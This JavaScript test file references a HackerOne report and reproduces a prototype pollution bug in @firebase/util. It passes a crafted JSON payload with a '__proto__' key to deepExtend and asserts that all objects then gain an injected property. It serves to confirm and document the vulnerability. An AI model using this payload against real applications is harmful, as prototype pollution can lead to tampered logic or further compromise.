//https://hackerone.com/reports/1001218
test("prototype pollution in @firebase/util", () => {
  expect({}.polluted).toBe(undefined);

  const utils = require("@firebase/util");
  const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
  utils.deepExtend({}, source);

  expect({}.polluted).toBe("yes");
});
